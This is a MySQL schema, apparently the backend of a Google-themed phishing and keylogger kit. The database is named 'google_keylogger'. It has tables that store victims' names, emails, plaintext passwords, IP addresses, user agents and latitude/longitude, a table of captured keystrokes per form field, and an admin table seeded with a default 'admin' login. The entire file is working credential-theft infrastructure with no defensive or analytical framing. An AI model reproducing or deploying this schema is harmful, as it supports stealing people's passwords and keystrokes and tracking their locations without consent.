CREATE DATABASE IF NOT EXISTS google_keylogger CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
USE google_keylogger;

CREATE TABLE IF NOT EXISTS credentials (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(100) NOT NULL DEFAULT '',
    email VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL DEFAULT '',
    ip VARCHAR(45) NOT NULL DEFAULT '',
    user_agent TEXT,
    country VARCHAR(100) DEFAULT '',
    city VARCHAR(100) DEFAULT '',
    latitude DECIMAL(10,8) DEFAULT NULL,
    longitude DECIMAL(11,8) DEFAULT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_email (email),
    INDEX idx_created_at (created_at),
    INDEX idx_ip (ip)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS keylogs (
    id INT AUTO_INCREMENT PRIMARY KEY,
    email_identifier VARCHAR(255) DEFAULT '',
    key_data TEXT,
    field_context VARCHAR(50) DEFAULT '',
    full_log TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_email_id (email_identifier),
    INDEX idx_created (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS admin_users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL UNIQUE,
    password_hash VARCHAR(255) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT IGNORE INTO admin_users (username, password_hash) VALUES
('admin', '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi');
